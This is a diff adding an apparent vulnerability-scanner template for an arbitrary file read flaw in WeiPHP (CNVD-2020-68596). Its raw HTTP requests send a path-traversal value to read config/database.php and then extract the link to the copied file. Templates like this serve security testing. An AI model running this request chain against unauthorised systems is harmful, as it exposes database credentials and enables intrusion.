@@ -1,0 +1,47 @@
+id: weiphp-arbitrary-file-read-cnvd-2020-68596
+
+info:
+  name: WeiPHP Arbitrary File Read (CNVD-2020-68596)
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    WeiPHP versions <= 5.0 are vulnerable to an arbitrary file read vulnerability. A remote attacker who successfully exploits this vulnerability can read arbitrary files on the target system.
+  reference:
+    - https://www.cnvd.org.cn/flaw/show/CNVD-2020-68596
+
+variables:
+  filepath: "./../config/database.php"
+
+http:
+  - raw:
+      - |
+        GET /public/index.php/material/Material/_download_imgage?media_id=1&picUrl={{filepath}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        regex:
+          - "^\\d+$"
+
+  - raw:
+      - |
+        GET /public/index.php/home/file/user_pics HTTP/1.1
+        Host: {{Hostname}}
+
+    extractors:
+      - type: regex
+        part: body
+        regex:
+          - '<img src="(.*?)" width="100" height="100"/><span class="ck-ico"></span><input type="hidden" value="\\d+"/>'
+        group: 1
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
